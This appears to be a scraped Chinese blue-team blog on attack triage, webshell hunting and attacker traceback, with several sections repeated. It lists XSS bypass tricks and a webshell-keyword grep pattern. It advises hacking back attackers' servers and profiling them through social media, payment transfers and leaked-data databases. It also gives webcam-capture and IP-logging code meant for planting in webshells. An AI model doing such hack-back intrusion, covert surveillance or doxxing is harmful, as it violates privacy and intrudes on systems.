对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#13响应状态码都有哪些"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#14发现一个sql注入告警怎么判断"},{"categories":["hvv"],"content":"\r攻击源捕获：发生网络攻击事件的时候，我们应急响应的过程中，需要通过安全设备辅助，利用IDS/IPS/态势感知/蜜罐/沙箱甚至是全流量的告警辅助的手法去获取攻击者的信息，比如攻击者开始攻击的时间、攻击的手法、利用的漏洞、攻击入口点、是否在服务器里留下后门、攻击者IP，被攻击主机等，获取此类信息不仅仅是为了后续的溯源取证，也为了后续的加固 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:2:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#攻击源捕获"},{"categories":["hvv"],"content":"\r日志审计：服务器的安全日志、web服务日志、数据库日志、安全设备相关日志（waf日志、安全软件日志等） 与流量分析，通过异常流量分析具体攻击行为、攻击手法、攻击源地址与目的地址 服务器异常捕获，异常的文件程序。非正常用户、恶意的外部通信、异常进程、端口、计划任务、启动项、注册表、快捷方式、隐藏文件等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:3:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#日志审计"},{"categories":["hvv"],"content":"\r网络攻击溯源：可细分为追踪溯源攻击主机、追踪溯源攻击控制主机、追踪溯源攻击者、追踪溯源攻击组织机构 常用溯源分析方法包括域名/IP地址分析、入侵日志监测、全流量分析、同源分析、攻击模型分析 通过查询域名的whois信息，可以关联到攻击者部分信息，注册名，注册邮箱，注册地址，电话，注册时间，服务商等。 溯源的一般会获取到几个相关信息:攻击时间、攻击IP、攻击类型、恶意文件、受攻击的IP或域名。其中攻击IP、攻击类型、恶意文件、攻击详情是溯源分析的入手点。 通过攻击类型分析攻击详情的请求包，验证是否可以获取到攻击者相关信息，然后通过相关特征进行威胁情报查询来判断所用IP具体是代理的IP还是真实IP地址。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#网络攻击溯源"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#溯源流程"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#1信息查询"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#2定位目标利用精准ip定位进行ip目标位置的确定"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#3收集互联网信息侧的用户id"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#4进入跳板机收集信息"},{"categories":["hvv"],"content":"\r邮件钓鱼攻击溯源：钓鱼邮件攻击通常分为两种：一种带有附件的word宏病毒，一种是引导受害者进入钓鱼网站来获取受害者的敏感信息。 获取信息：通过查看邮件原文，获取发送方IP地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息 对钓鱼网页的处理： 可以通过相关联的域名/IP进行追踪； 对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息； 对邮件附件的处理： 对附件进行逆向，看附件是否包含红队物理路径信息，会暴露其用户名ID 把附件放进云沙箱，提取C2域名 邮件导出为eml格式，提取发信人IP 尽可能多的诱导对方提供攻击样本和链接 通过SIEM策略加快查找： 同一个发件人，给超5个人发邮件的，筛出来 同一个标题邮件，日志数超过10条的，筛出来 所有对外公开的邮箱，逐一排查 所有带附件的邮箱，考虑到免杀，再人工排查一遍 获取到邮箱后： WHOIS反查域名 邮箱前缀可能是红队ID，搜索引擎反查 天眼查、企查查反查公司 reg007.com查注册过的网站，通过找回密码，进一步找信息 获取到手机号后： 查脉脉、领英，得到毕业院校、工作经历 查微博、知乎、github等社交账号 微信、支付宝转账，得到部分真实姓名 社工库查询 拿到域名后： WHOIS反查注册人，要是开启了隐私保护，就查域名历史IP解析，然后根据查到的IP，再继续查IP历史解析域名，总之套娃。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:2","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#邮件钓鱼攻击溯源"},{"categories":["hvv"],"content":"\rweb入侵溯源：**溯源方式：**隔离webshell样本，使用Web日志还原攻击路径，找到安全漏洞位置进行漏洞修复，从日志可以找到攻击者的IP地址，但攻击者一般都会使用代理服务器或匿名网络（例如Tor）来掩盖其真实的IP地址。 在入侵过程中，使用反弹shell、远程下载恶意文件、端口远程转发等方式，也容易触发威胁阻断，而这个域名/IP，提供一个反向信息收集和渗透测试的路径。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:5:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#web入侵溯源"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#溯源反制"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#ip定位法"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#蜜罐捕获法"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#常规渗透反打"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#ip有服务"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#ip无服务"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： \u003chtml\u003e \u003chead\u003e \u003cscript\u003e function takePhoto() { // 获取video元素 const video = document.getElementById(\"video\"); // 创建一个canvas元素 const canvas = document.createElement(\"canvas\"); // 设置canvas元素的大小 canvas.width = video.videoWidth; canvas.height = video.videoHeight; // 将video图像画到canvas上 canvas.getContext(\"2d\").drawImage(video, 0, 0); // 将canvas元素转换为图片并显示 const image = new Image(); image.src = canvas.toDataURL(\"image/png\"); document.body.appendChild(image); } \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003c!-- 创建一个video元素 --\u003e \u003cvideo id=\"video\" width=\"640\" height=\"480\" autoplay\u003e\u003c/video\u003e \u003c!-- 创建一个按钮，点击拍照 --\u003e \u003cbutton onclick=\"takePhoto()\"\u003eTake Photo\u003c/button\u003e \u003c!-- 请求访问用户的摄像头 --\u003e \u003cscript\u003e // 创建一个MediaStream对象 const stream = navigator.mediaDevices.getUserMedia({ video: true }); // 将MediaStream对象绑定到video元素上 stream.then(function(mediaStream) { const video = document.getElementById(\"video\"); video.srcObject = mediaStream; }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo '\u003cbr/\u003e'; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo '\u003cbr/\u003e'; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo '\u003cbr/\u003e'; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 